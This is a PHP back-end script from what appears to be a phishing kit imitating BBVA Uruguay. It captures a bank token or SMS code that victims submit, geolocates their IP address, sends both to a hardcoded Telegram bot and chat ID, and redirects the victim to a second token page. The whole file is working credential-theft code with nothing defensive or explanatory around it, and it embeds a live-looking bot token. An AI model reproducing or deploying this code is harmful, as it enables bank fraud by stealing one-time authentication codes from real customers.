<?php
$token = '5490265950:AAHoe7yb6zqmDknXlBj5RxM6ZUldazvi8SQ';
$website = 'https://api.telegram.org/bot'.$token;

    $ip = $_SERVER["REMOTE_ADDR"];
    $chat_id = "5798638424";
   


if (isset($_POST["Token"])) {
    $dni = $_POST['Token'];

    
    
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ip_data_in = curl_exec($ch);
curl_close($ch);
$ip_data = json_decode($ip_data_in, true);
 

    //$time = gmstrftime("%Y. %B %d. %A. %X %Z");
    $agent = $_SERVER["HTTP_USER_AGENT"];
    $ip = $_SERVER["REMOTE_ADDR"];
    $browser = get_browser_name($_SERVER["HTTP_USER_AGENT"]);

    
    $msg = "\n🤔User entered Token 1🤔\n📧Token/Sms: => " . $dni . "\n=============================  " . "\n📍 IP: " . $ip . "\n==\n";
            
    
     $url = $GLOBALS['website'].'/sendMessage?chat_id='.$chat_id.'&parse_mode=HTML&text='.urlencode($msg);
            file_get_contents($url);
    
        
       //echo '<script>window.location.href = "https://www.bbva.com.uy/personas.html";</script>';
       
       echo '<script>
       
       window.location.href = "token2.php";</script>';
}
    
function get_browser_name($user_agent)
{
    if (strpos($user_agent, "Opera") || strpos($user_agent, "OPR/")) {
        return "Opera";
    }
    if (strpos($user_agent, "Edge")) {
        return "Edge";
    }
    if (strpos($user_agent, "Chrome")) {
        return "Chrome";
    }
    if (strpos($user_agent, "Safari")) {
        return "Safari";
    }
    if (strpos($user_agent, "Firefox")) {
        return "Firefox";
    }
    if (strpos($user_agent, "MSIE") || strpos($user_agent, "Trident/7")) {
        return "Internet Explorer";
    }
    return "Other";
}
